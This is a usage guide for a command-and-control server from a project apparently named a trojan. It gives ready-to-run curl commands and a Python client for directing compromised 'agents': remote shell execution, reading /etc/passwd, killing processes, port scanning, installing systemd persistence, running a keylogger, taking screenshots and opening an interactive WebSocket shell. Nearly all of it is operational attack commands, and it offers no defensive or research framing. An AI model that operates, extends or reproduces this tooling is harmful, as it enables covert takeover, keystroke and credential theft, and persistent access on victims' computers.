# Usage Guide

## Starting the C2 Server

```bash
cd /home/hainx/Documents/Trojan-HAILAMDEV
./bin/c2
```

Server starts on `https://0.0.0.0:8443` with API at `/api/v1`

## Web UI Access

Open browser to `https://localhost:8443` (accept self-signed cert warning)

API Documentation at `https://localhost:8443/api/v1/health`

## Managing Agents

### List All Agents
```bash
curl -k https://localhost:8443/api/v1/agents
```

### Get Specific Agent
```bash
curl -k https://localhost:8443/api/v1/agents/<agent-id>
```

### Execute Shell Command
```bash
curl -k -X POST https://localhost:8443/api/v1/commands \
  -H "Content-Type: application/json" \
  -d '{"agent_id": "<agent-id>", "type": "shell", "payload": {"command": "whoami"}}'
```

### Check Command Result
```bash
curl -k https://localhost:8443/api/v1/commands/<command-id>
```

## Module Operations

### File Operations
```bash
# List directory
curl -k -X POST https://localhost:8443/api/v1/modules/execute \
  -H "Content-Type: application/json" \
  -d '{"agent_id": "<id>", "module": "file", "args": {"action": "list", "path": "/home/user"}}'

# Read file
curl -k -X POST https://localhost:8443/api/v1/modules/execute \
  -H "Content-Type: application/json" \
  -d '{"agent_id": "<id>", "module": "file", "args": {"action": "read", "path": "/etc/passwd"}}'

# Write file
curl -k -X POST https://localhost:8443/api/v1/modules/execute \
  -H "Content-Type: application/json" \
  -d '{"agent_id": "<id>", "module": "file", "args": {"action": "write", "path": "/tmp/test.txt", "data": "SGVsbG8gV29ybGQ="}}'
```

### Process Management
```bash
# List processes
curl -k -X POST https://localhost:8443/api/v1/modules/execute \
  -H "Content-Type: application/json" \
  -d '{"agent_id": "<id>", "module": "process", "args": {"action": "list"}}'

# Kill process
curl -k -X POST https://localhost:8443/api/v1/modules/execute \
  -H "Content-Type: application/json" \
  -d '{"agent_id": "<id>", "module": "process", "args": {"action": "kill", "pid": 1234}}'
```

### Network Reconnaissance
```bash
# Port scan
curl -k -X POST https://localhost:8443/api/v1/modules/execute \
  -H "Content-Type: application/json" \
  -d '{"agent_id": "<id>", "module": "network", "args": {"action": "scan", "host": "192.168.1.1", "ports": [22, 80, 443]}}'

# List connections
curl -k -X POST https://localhost:8443/api/v1/modules/execute \
  -H "Content-Type: application/json" \
  -d '{"agent_id": "<id>", "module": "network", "args": {"action": "connections"}}'
```

### System Information
```bash
curl -k -X POST https://localhost:8443/api/v1/modules/execute \
  -H "Content-Type: application/json" \
  -d '{"agent_id": "<id>", "module": "system", "args": {"action": "info"}}'
```

### Persistence
```bash
# List available methods
curl -k -X POST https://localhost:8443/api/v1/modules/execute \
  -H "Content-Type: application/json" \
  -d '{"agent_id": "<id>", "module": "persistence", "args": {"action": "list"}}'

# Install persistence
curl -k -X POST https://localhost:8443/api/v1/modules/execute \
  -H "Content-Type: application/json" \
  -d '{"agent_id": "<id>", "module": "persistence", "args": {"action": "install", "method": "systemd_service"}}'
```

### Keylogger
```bash
# Start keylogger
curl -k -X POST https://localhost:8443/api/v1/modules/execute \
  -H "Content-Type: application/json" \
  -d '{"agent_id": "<id>", "module": "keylogger", "args": {"action": "start"}}'

# Get logs
curl -k -X POST https://localhost:8443/api/v1/modules/execute \
  -H "Content-Type: application/json" \
  -d '{"agent_id": "<id>", "module": "keylogger", "args": {"action": "get"}}'

# Stop keylogger
curl -k -X POST https://localhost:8443/api/v1/modules/execute \
  -H "Content-Type: application/json" \
  -d '{"agent_id": "<id>", "module": "keylogger", "args": {"action": "stop"}}'
```

### Screenshot
```bash
curl -k -X POST https://localhost:8443/api/v1/modules/execute \
  -H "Content-Type: application/json" \
  -d '{"agent_id": "<id>", "module": "screenshot", "args": {"quality": 80, "monitor": 1}}'
```

## Interactive Shell (WebSocket)

### Connect via WebSocket
```bash
# Using wscat
wscat -c wss://localhost:8443/ws/agents/<agent-id>
```

### Send Commands
```json
{"action": "shell", "command": "ls -la /home"}
```

### Receive Responses
```json
{"type": "response", "command_id": "uuid", "result": {"output": "...", "error": ""}}
```

## Real-time Events (WebSocket)

```bash
wscat -c wss://localhost:8443/ws/events
```

Receives periodic stats updates:
```json
{"type": "stats_update", "agent_count": 3, "timestamp": 1699999999}
```

## Python Client Example

```python
import requests
import json

BASE = "https://localhost:8443/api/v1"

def list_agents():
    return requests.get(f"{BASE}/agents", verify=False).json()

def execute_shell(agent_id, command):
    resp = requests.post(f"{BASE}/commands", json={
        "agent_id": agent_id,
        "type": "shell",
        "payload": {"command": command}
    }, verify=False)
    return resp.json()

def execute_module(agent_id, module, args):
    resp = requests.post(f"{BASE}/modules/execute", json={
        "agent_id": agent_id,
        "module": module,
        "args": args
    }, verify=False)
    return resp.json()

# Usage
agents = list_agents()
for agent in agents['agents']:
    print(f"Agent: {agent['hostname']} ({agent['id']})")
    result = execute_shell(agent['id'], 'whoami')
    print(f"Command queued: {result['command_id']}")
```

## Security Notes

1. **Self-signed certificates**: Use `-k`/`--insecure` with curl or import CA
2. **Network exposure**: Bind to specific interface in production
3. **Authentication**: Add JWT/API key middleware before production use
4. **Logging**: All commands logged to stdout in JSON format
5. **Encryption**: All agent communication encrypted with AES-256-GCM
6. **Key rotation**: Automatic every hour (configurable)

## Troubleshooting

### Agent Not Appearing
- Check agent logs for connection errors
- Verify C2 host/port in agent config
- Ensure firewall allows port 8443
- Check TLS certificate matches

### Command Timeout
- Increase timeout in request
- Check agent status (may be disconnected)
- Verify agent has required module enabled

### Module Not Found
- Check agent's enabled modules list
- Rebuild agent with required modules
- Verify module name spelling